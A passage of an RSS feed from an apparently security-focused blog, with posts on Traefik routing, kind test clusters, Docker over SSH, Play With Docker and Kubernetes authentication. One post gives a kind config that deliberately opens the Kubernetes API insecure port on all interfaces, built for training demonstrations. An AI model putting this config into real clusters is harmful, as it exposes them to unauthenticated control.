&lt;p&gt;If you’ve made it all the way to the bottom of this post, I’ll briefly pimp out my &lt;a href=&quot;https://www.blackhat.com/us-19/training/schedule/index.html#mastering-container-security-140201547156094&quot;&gt;Mastering Container Security&lt;/a&gt; course, which I’m running at Black Hat USA this year, where we’ll be covering this and much much more container security goodness :)&lt;/p&gt;
</description>
				<pubDate>Mon, 01 Apr 2019 19:10:39 +0100</pubDate>
				<link>/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</link>
				<guid isPermaLink="true">/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/</guid>
			</item>
		
			<item>
				<title>Traefiking in Presentations</title>
				<description>&lt;p&gt;One of the common tasks in a containerized environment, where you could be running multiple applications in containers on a single host, is “what’s the best way to route traffic to my web applications”?&lt;/p&gt;

&lt;p&gt;Whilst you could expose each application on a dedicated port, that’s not a great user experience.  A better idea is to make use of a reverse proxy (a.k.a ingress in Kubernetes-land) to route traffic to the correct container based on a set of rules.&lt;/p&gt;

&lt;p&gt;Recently I noticed that &lt;a href=&quot;https://traefik.io/&quot;&gt;traefik&lt;/a&gt; had a new version on the horizon, so I decided to give it a spin.&lt;/p&gt;

&lt;p&gt;My use case is pretty straightforward.  I’ve got a number of presentations that I’ve given over the last couple of years which are all bundled as Docker images (using &lt;a href=&quot;https://github.com/dploeger/jekyll-revealjs&quot;&gt;jekyll-revealjs&lt;/a&gt;). I like this method of writing presentations, as it lets me create the content in a series of markdown files, which are nice and easy to edit, and then bundle up the resulting presentation as a web application runnning in a Docker image, meaning it can be delivered from any Internet connected host.&lt;/p&gt;

&lt;p&gt;Traefik configuration can be done using a Docker compose file, where labels in the service definition let traefik know how to route specific requests.  My planned layout was just to specify hosts on my domain (pwndland.uk) for each presentation.&lt;/p&gt;

&lt;p&gt;The main “Gotcha” I encountered when writing the configuration below was that I needed to explicitly specify the port on the container network that was hosting the application using &lt;code class=&quot;highlighter-rouge&quot;&gt;expose&lt;/code&gt; statements, otherwise traefik wouldn’t know how to route traffic.&lt;/p&gt;

&lt;p&gt;One note from a security perspective if you’re making use of Traefik, is that it&lt;/p&gt;

&lt;p&gt;The configuration for my presentations ended up looking as below, and the presentations should be available on these URLS&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://ltdh.pwndland.uk/#/&quot;&gt;Le Tour Du Hack Presentation - A security Persons life or, “The art of being Cassandra”&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://kube.pwndland.uk/#/&quot;&gt;44Con March 2019 - Cloudy Clusters Catastrope?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://container-runtime.pwndland.uk/#/&quot;&gt;Cloud Native Glasgow - Fistful of Container Runtimes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://docker.pwndland.uk/#/&quot;&gt;BSides London 2016 - Docker - Security Myths, Security Legends&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;version: &#39;3&#39;

services:
  reverse-proxy:
    image: traefik:v2.0 # The official v2.0 Traefik docker image
    command: --providers.docker # Enables the web UI and tells Traefik to listen to docker
    ports:
      - &quot;80:80&quot;     # The HTTP port
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock # So that Traefik can listen to the Docker events
  ltdh:
    image: raesene/ltdh_presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.ltdh.rule=Host(`ltdh.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  kube:
    image: raesene/kube2019pres
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.kube.rule=Host(`kube.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  container-runtime:
    image: raesene/container-runtime-presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.container-runtime.rule=Host(`container-runtime.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
  docker:
    image: raesene/bsides_presentation
    expose:
      - &quot;4000&quot;
    labels:
      - &quot;traefik.http.routers.docker.rule=Host(`docker.pwndland.uk`)&quot;
      - &quot;traefik.domain=`pwndland.uk`&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
				<pubDate>Mon, 25 Mar 2019 21:10:39 +0100</pubDate>
				<link>/blog/2019/03/25/traefiking-in-presentations/</link>
				<guid isPermaLink="true">/blog/2019/03/25/traefiking-in-presentations/</guid>
			</item>
		
			<item>
				<title>Kind of Insecure Test Clusters</title>
				<description>&lt;p&gt;One of the great things about the Kubernetes ecosystem is all the new projects that come out on a regular basis to help do various things (keeping up with them can be a challenge, of course).&lt;/p&gt;

&lt;p&gt;For a while I’ve been looking for a way to quickly spin up test clusters that I can use in the container security training course I deliver.  I’ve got some automation with Ansible and Kubeadm which works, but still involves multiple VMs per cluster, which is a bit heavy when you start wanting one per person on a 20 person course.&lt;/p&gt;

&lt;p&gt;So when I heard about &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; on an episode of Heptio’s &lt;a href=&quot;https://www.youtube.com/playlist?list=PLvmPtYZtoXOENHJiAQc6HmV2jmuexKfrJ&quot;&gt;TGIK&lt;/a&gt; I thought this looked like a really cool tool which might fit the bill, as it lets you spin up Kubernetes clusters inside Docker containers, making it easy for several distinct clusters to live on a single VM.&lt;/p&gt;

&lt;p&gt;Kind is in a relatively early stage of development at the moment with their 0.1 release having come out in January, but it works pretty well.  At base when you run it, it’ll bring up a cluster with the kubeadm default configuration options, which are pretty good from a security perspective these days.&lt;/p&gt;

&lt;p&gt;What I wanted to do however, is modify those to add specific security weaknesses for demonstration purposes.&lt;/p&gt;

&lt;p&gt;Kind supports a &lt;code class=&quot;highlighter-rouge&quot;&gt;--config&lt;/code&gt; option which lets you customize the cluster as you bring it up.  It took a little while for me to work out the correct syntax (thanks to &lt;a href=&quot;https://twitter.com/BenTheElder&quot;&gt;@BenTheElder&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/mauilion&quot;&gt;@mauillon&lt;/a&gt; for all the help pointing me in the right direction), but once you’ve got the basics it’s not too hard.&lt;/p&gt;

&lt;p&gt;The customization is based on the Kubeadm API with a key difference that the customized values need placed in quotes.&lt;/p&gt;

&lt;p&gt;To provide a concrete example, the config below will create a cluster with the insecure port running on the API server&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kind: Config
apiVersion: kind.sigs.k8s.io/v1alpha2
nodes:
# the control plane node config
- role: control-plane
  # patch the generated kubeadm config with some extra settings
  kubeadmConfigPatches:
  - |
    apiVersion: kubeadm.k8s.io/v1beta1
    kind: ClusterConfiguration
    metadata:
      name: config
    apiServer:
      extraArgs:
        # Here the values must be in quotes, unlike the Kubeadm API examples
        insecure-bind-address: &quot;0.0.0.0&quot;
        insecure-port: &quot;8080&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got kind installed and this is present as a YAML file you can just run&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kind --config insecure-port.yaml --name insecure create cluster&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and kind will create your cluster node for you.  Once it’s up it’s worth noting that the insecure port won’t be visible on the main interface of your VM but will be listening on the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker0&lt;/code&gt; interface.&lt;/p&gt;

&lt;p&gt;So you can get the IP address of that interface from &lt;code class=&quot;highlighter-rouge&quot;&gt;docker inspect insecure-control-plane&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and then check to confirm that the insecure API is open with something like the below (assuming that the IP address it’s using is &lt;code class=&quot;highlighter-rouge&quot;&gt;172.17.0.3&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://172.17.0.3:8080/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I’ve started creating some sample configurations for some of the common insecure configurations you can see in Kubernetes clusters and putting them up on Github &lt;a href=&quot;https://github.com/raesene/kind-of-insecure&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
</description>
				<pubDate>Mon, 04 Mar 2019 21:10:39 +0100</pubDate>
				<link>/blog/2019/03/04/kind-of-insecure-test-clusters/</link>
				<guid isPermaLink="true">/blog/2019/03/04/kind-of-insecure-test-clusters/</guid>
			</item>
		
			<item>
				<title>Docker 18.09 - Making WSL that much easier</title>
				<description>&lt;p&gt;After a little delay Docker 18.09 got it’s final release this week.  This is a release I’ve been looking forward to for a while now, as it’s got a couple of cool new features, which should help in day-to-day usage of Docker.&lt;/p&gt;

&lt;p&gt;The main one is the incorporation of remote connections to Docker Engine instances via SSH.  This means that, if you want to connect to a remote Docker Engine instance, instead of having to setup TLS certificate and modifying the configuration at the server-side, you can simply make a change on the client-side configuration and get easy remote access!&lt;/p&gt;

&lt;p&gt;One of the places this is most useful is with WSL.  To take the basic case, say you’ve got a Linux VM on your host and you’d like to use WSL for Docker development and administration.  First up you’ll need to install the Docker client in WSL.  Fortunately another change that came along with 18.09 makes this easier for you.  There’s a new Client only deb file so you can just install that, rather than installing the server-side engine components.&lt;/p&gt;

&lt;p&gt;First step is to follow the &lt;a href=&quot;https://docs.docker.com/install/linux/docker-ce/ubuntu/&quot;&gt;Docker-CE installation instructions&lt;/a&gt; down to the point of installing Docker, then instead of the usual &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo apt install -y docker-ce&lt;/code&gt; do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install -y docker-ce-cli
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need to tell our client where to connect.  For this we just need to modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;DOCKER_HOST&lt;/code&gt; environment variable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DOCKER_HOST=ssh://YOUR_HOSTNAME_OR_IP_HERE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you’ve got that configured, assuming that both client and server are running 18.09 or higher, things should just work!&lt;/p&gt;

&lt;p&gt;A couple of tips to make things smoother :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;This works best if your usernames are the same on both client and host, as SSH will assume that that’s the username to use.  You can also configure &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh/config&lt;/code&gt; to specify what username to use, so as to avoid having to type it in every time.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;If you’re using password based login for the remote server, you’re going to get prompted for the password a lot, which is kind of annoying.  The best approach here is to configure SSH key based login and run an SSH agent so you only need to enter a passphrase once.  This is in general a much nicer way to do admin for systems over SSH, so well worth setting up.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Sun, 11 Nov 2018 15:10:39 +0100</pubDate>
				<link>/blog/2018/11/11/Docker-18-09-SSH/</link>
				<guid isPermaLink="true">/blog/2018/11/11/Docker-18-09-SSH/</guid>
			</item>
		
			<item>
				<title>Using 'Try with PWD' buttons to demonstrate apps</title>
				<description>&lt;p&gt;I came across a very interesting post &lt;a href=&quot;https://medium.com/@patternrecognizer/how-to-add-a-try-in-play-with-docker-button-to-your-github-project-41cb65721e94&quot;&gt;this morning&lt;/a&gt; on &lt;a href=&quot;https://labs.play-with-docker.com/&quot;&gt;using Play With Docker&lt;/a&gt; (PWD) to let people try out applications directly from your GitHub repository.  If you’ve not tried out Play With Docker before (or it’s companion site, &lt;a href=&quot;https://labs.play-with-k8s.com/&quot;&gt;Play with Kubernetes&lt;/a&gt;), they’re very useful resources which let you try things out in disposable Docker and Kubernetes environments.  Handy for training courses amongst other things.&lt;/p&gt;

&lt;p&gt;What I hadn’t realised before was that you can pass a Docker compose file in as a parameter to a PWD URL and have it automatically spin up an instance of that stack.  This model seems super-useful for trying out new applications in disposable environments and works well with web applications, as we’ll see.&lt;/p&gt;

&lt;p&gt;So having read the post I thought I’d try adding a sample instance for my &lt;a href=&quot;https://github.com/raesene/dockerized-security-tools&quot;&gt;Dockerized Security Tools&lt;/a&gt; project.  From the tools I’ve got in there at the moment, the best candidate for a try out looked to be &lt;a href=&quot;https://dradisframework.com/ce/&quot;&gt;Dradis-CE&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I knocked up a very basic Docker compose file for it, and then put a button referencing it in the Readme, with this as the result.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://labs.play-with-docker.com/?stack=https://raw.githubusercontent.com/raesene/dockerized-security-tools/master/dradis/docker-compose.yml&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/play-with-docker/stacks/master/assets/images/button.png&quot; alt=&quot;Try in PWD&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you click that button and then login (you’ll need a Docker Hub account for this, but they’re free to create), PWD will launch the application.  The only other trick to trying it out is that you need to click a link in the PWD interface to access the exposed application.&lt;/p&gt;

&lt;p&gt;There will be a grey oval next to the IP address at the top with the exposed port number (in this case 3000).  Clicking that link should take you into a running instance of Dradis! The first page load will be a little slow, but after that it should work just fine.&lt;/p&gt;

&lt;p&gt;I could see this having a number of use cases, things like running up instances of &lt;a href=&quot;https://www.owasp.org/index.php/OWASP_Juice_Shop_Project&quot;&gt;OWASP Juice Shop&lt;/a&gt; to try out tools or similar.&lt;/p&gt;

&lt;p&gt;The runtime is limited to four hours, but that should be plenty for a quick look round a tool to see what it’s like.&lt;/p&gt;
</description>
				<pubDate>Sun, 21 Oct 2018 15:10:39 +0100</pubDate>
				<link>/blog/2018/10/21/Try-With-PWD/</link>
				<guid isPermaLink="true">/blog/2018/10/21/Try-With-PWD/</guid>
			</item>
		
			<item>
				<title>Kubernetes authentication woes and secret user database</title>
				<description>&lt;p&gt;Based on the Kubernetes security reviews I’ve done, one of the most problematic areas for clusters is user authentication.  Whilst Kubernetes provides a wide range of options, it lacks the “traditional” user database that you might expect to see with a multi-user networked system.  Using external OIDC or webhook providers is often complex, so many clusters make use of the in-built authentication options which are :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Basic Authentication&lt;/li&gt;
  &lt;li&gt;Token Authentication&lt;/li&gt;
  &lt;li&gt;Certificate Authentication&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first two get marked down as they involve storing credentials in the clear on the Kubernetes master nodes and require an API server re-start to update (not the best).&lt;/p&gt;

&lt;p&gt;That leaves quite a few operators of Kubernetes clusters making use of certificate authentication, however this also has some security problems.  The lack of certificate revocation means that if one of your users loses their certificate (or leaves the organization) your only choice is to recreate the entire Certificate Authority (not a great experience)!  Also as new client certificates can be created outside of the Kubernetes API, there’s no effective tracking of user accounts, so you could (for example) have multiple users with the same username, making it tricky to accurately audit user actions.  Lastly the Kubernetes Controller Manager expects to have the Certificate Authority root online and accessible to be able to create new certificates, so it’s exposed to attackers who can get access to that directory on the Kubernetes API server.  This can be problematic as once they’ve got the root key, attackers can issue their own certificates providing persistent access to the cluster (for the lifetime of that key).&lt;/p&gt;

&lt;p&gt;It was with this backdrop that I was interested to see on a recent review an install making a creative use of service account tokens.  Whilst these are intended for use by pod to communicate with the API server there’s nothing to stop you putting a service account token into your Kubeconfig files and using it for user authentication, giving you (effectively) a user database!&lt;/p&gt;

&lt;p&gt;There are obvious advantages over certificate authentication in that you can revoke the secrets associated with a service account whenever you like and you can also provide individual tokens to individual users allowing for user auditing.&lt;/p&gt;

&lt;p&gt;I’ll caveat this with a note of caution, which is that Kubernetes service accounts and tokens aren’t really designed to be a user database, and if your secrets are exposed then you risk attackers being able to impersonate your users!  Ideally in production clusters you should make use of external authentication options, which allow for better control of user accounts…&lt;/p&gt;
</description>
				<pubDate>Mon, 10 Sep 2018 18:10:39 +0100</pubDate>
				<link>/blog/2018/09/10/Kubernetes-Secret-User-Database/</link>
				<guid isPermaLink="true">/blog/2018/09/10/Kubernetes-Secret-User-Database/</guid>
			</item>
		
	</channel>
</rss>
